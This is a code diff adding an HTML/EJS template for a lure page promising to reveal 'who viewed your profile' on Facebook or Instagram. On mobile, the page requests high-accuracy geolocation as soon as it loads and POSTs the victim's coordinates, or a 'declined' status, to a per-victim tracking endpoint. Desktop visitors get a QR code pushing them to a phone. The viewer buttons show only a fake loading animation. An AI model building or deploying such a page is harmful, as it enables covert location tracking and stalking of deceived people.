@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Who's Viewed Your Profile?</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-white flex items-center justify-center h-screen">
+        <!-- Desktop Message & QR Code -->
+        <div id="desktopMessage"
+            class="hidden text-center max-w-lg mt-8 px-4 py-6 bg-gray-200 rounded-lg shadow-lg">
+            <p class="text-xl font-semibold text-red-600 mb-4">
+                This page can only be viewed on mobile. Please scan the QR code
+                below on your mobile phone to visit on your mobile device.
+            </p>
+            <div class="mt-4 flex justify-center">
+                <div class="bg-white p-4 rounded-lg shadow-md">
+                    <img
+                        class="border-2 border-gray-300 rounded-md"
+                        src="https://api.qrserver.com/v1/create-qr-code/?data=https://phonetracehub.com/track/<%= trackId %>&size=250x250"
+                        alt="QR Code" />
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Tracking Content -->
+        <div id="trackContent"
+            class="hidden bg-white shadow-lg rounded-2xl p-6 max-w-md w-full text-center">
+            <h1 class="text-2xl font-bold text-gray-800">See Who's Viewed Your
+                Profile</h1>
+            <p class="text-gray-500 mt-2">Enable location when prompted to find
+                out who has been checking out your profile and where they're
+                from!</p>
+
+            <!-- Action Buttons (Facebook and Instagram) -->
+            <div id="buttons" class="mt-6 space-y-4">
+                <button id="facebookBtn"
+                    class="w-full py-3 px-6 bg-blue-600 text-white rounded-lg flex items-center justify-center space-x-3 hover:bg-blue-700">
+                    <!-- Facebook Icon (SVG) -->
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" fill="currentColor" viewBox="0 0 448 512"><path d="M64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64h98.2V334.2H109.4V256h52.8V222.3c0-87.1 39.4-127.5 125-127.5c16.2 0 44.2 3.2 55.7 6.4V172c-6-.6-16.5-1-29.6-1c-42 0-58.2 15.9-58.2 57.2V256h83.6l-14.4 78.2H255V480H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64z"/></svg>
+                    <span>See Facebook Viewers</span>
+                </button>
+
+                <button id="instagramBtn"
+                    class="w-full py-3 px-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white rounded-lg flex items-center justify-center space-x-3 hover:bg-gradient-to-r hover:from-purple-700 hover:to-pink-700">
+                    <!-- Instagram Icon (SVG) -->
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" fill="currentColor" viewBox="0 0 448 512"><path d="M194.4 211.7a53.3 53.3 0 1 0 59.3 88.7 53.3 53.3 0 1 0 -59.3-88.7zm142.3-68.4c-5.2-5.2-11.5-9.3-18.4-12c-18.1-7.1-57.6-6.8-83.1-6.5c-4.1 0-7.9 .1-11.2 .1c-3.3 0-7.2 0-11.4-.1c-25.5-.3-64.8-.7-82.9 6.5c-6.9 2.7-13.1 6.8-18.4 12s-9.3 11.5-12 18.4c-7.1 18.1-6.7 57.7-6.5 83.2c0 4.1 .1 7.9 .1 11.1s0 7-.1 11.1c-.2 25.5-.6 65.1 6.5 83.2c2.7 6.9 6.8 13.1 12 18.4s11.5 9.3 18.4 12c18.1 7.1 57.6 6.8 83.1 6.5c4.1 0 7.9-.1 11.2-.1c3.3 0 7.2 0 11.4 .1c25.5 .3 64.8 .7 82.9-6.5c6.9-2.7 13.1-6.8 18.4-12s9.3-11.5 12-18.4c7.2-18 6.8-57.4 6.5-83c0-4.2-.1-8.1-.1-11.4s0-7.1 .1-11.4c.3-25.5 .7-64.9-6.5-83l0 0c-2.7-6.9-6.8-13.1-12-18.4zm-67.1 44.5A82 82 0 1 1 178.4 324.2a82 82 0 1 1 91.1-136.4zm29.2-1.3c-3.1-2.1-5.6-5.1-7.1-8.6s-1.8-7.3-1.1-11.1s2.6-7.1 5.2-9.8s6.1-4.5 9.8-5.2s7.6-.4 11.1 1.1s6.5 3.9 8.6 7s3.2 6.8 3.2 10.6c0 2.5-.5 5-1.4 7.3s-2.4 4.4-4.1 6.2s-3.9 3.2-6.2 4.2s-4.8 1.5-7.3 1.5l0 0c-3.8 0-7.5-1.1-10.6-3.2zM448 96c0-35.3-28.7-64-64-64H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V96zM357 389c-18.7 18.7-41.4 24.6-67 25.9c-26.4 1.5-105.6 1.5-132 0c-25.6-1.3-48.3-7.2-67-25.9s-24.6-41.4-25.8-67c-1.5-26.4-1.5-105.6 0-132c1.3-25.6 7.1-48.3 25.8-67s41.5-24.6 67-25.8c26.4-1.5 105.6-1.5 132 0c25.6 1.3 48.3 7.1 67 25.8s24.6 41.4 25.8 67c1.5 26.3 1.5 105.4 0 131.9c-1.3 25.6-7.1 48.3-25.8 67z"/></svg>
+                    <span>See Instagram Viewers</span>
+                </button>
+            </div>
+
+            <!-- Profile Views Counter -->
+            <div class="mt-4 p-4 bg-gray-50 rounded-lg hidden" id="viewCounter">
+                <p class="text-xl font-semibold text-blue-600">
+                    <span id="viewCount">Loading...</span> Profile Views
+                </p>
+            </div>
+
+            <!-- Loading Animation (Initially Hidden) -->
+            <div id="loading" class="mt-4 text-gray-500 hidden">
+                <svg class="animate-spin h-6 w-6 mx-auto text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                <p class="mt-2">Finding Viewers Near You...</p>
+            </div>
+        </div>
+
+        <script>
+        const trackId = "<%= trackId %>";
+    
+        function sendLocation(latitude, longitude, status) {
+            console.log(`Sending location: ${latitude}, ${longitude} with status: ${status}`);
+            fetch(`/location/${trackId}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude, longitude, status })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Response received:", data))
+            .catch(error => console.error("Error sending location:", error));
+        }
+    
+        function requestLocation() {
+            console.log("Requesting location...");
+    
+            if (navigator.geolocation) {
+                console.log("Geolocation API supported!");
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        console.log("Location successfully retrieved:", position);
+                        // Logging location values before calling sendLocation
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+    
+                        // Check if sendLocation is being called
+                        sendLocation(latitude, longitude, 'Location Shared');
+                    },
+                    (error) => {
+                        console.error("Error retrieving location:", error);
+                        if (error.code === error.PERMISSION_DENIED) {
+                            console.error("User denied location permission.");
+                        }
+                        sendLocation(null, null, 'Location Declined');
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+    
+        // Make the function accessible from the console
+        window.requestLocation = requestLocation;
+    
+       
+
+        window.onload = () => {
+        const isMobile = window.matchMedia("only screen and (max-width: 767px)").matches;
+        const desktopMessage = document.getElementById("desktopMessage");
+        const trackContent = document.getElementById("trackContent");
+
+        if (!isMobile) {
+            // Hide tracking content and show desktop message
+            trackContent.style.display = 'none';
+            desktopMessage.style.display = 'block';
+        } else {
+            // Display tracking content for mobile
+            trackContent.style.display = 'block';
+            desktopMessage.style.display = 'none';
+            trackContent .classList.remove("hidden");
+            // Run requestLocation() only on mobile
+            console.log('Requesting Location...');
+            requestLocation();
+        }
+    };
+
+    const facebookBtn = document.getElementById('facebookBtn');
+    const instagramBtn = document.getElementById('instagramBtn');
+    const loadingElement = document.getElementById('loading');
+    const viewCounter = document.getElementById('viewCounter');
+
+    // Show loading and hide view counter
+    function showLoading() {
+        loadingElement.classList.remove('hidden');
+        viewCounter.classList.add('hidden');
+    }
+
+    // Hide loading and show view counter after a short delay
+    function hideLoading() {
+        setTimeout(() => {
+            loadingElement.classList.add('hidden');
+            viewCounter.classList.remove('hidden');
+        }, 2000); // 2-second delay for the loading animation
+    }
+
+    // Handle button clicks to trigger loading animation
+    facebookBtn.addEventListener('click', () => {
+        showLoading();
+        instagramBtn.classList.add("hidden");
+        facebookBtn.classList.add("hidden");
+    });
+
+    instagramBtn.addEventListener('click', () => {
+        showLoading();
+        instagramBtn.classList.add("hidden");
+        facebookBtn.classList.add("hidden");
+    });
+
+
+    </script>
+
+    </body>
+</html>
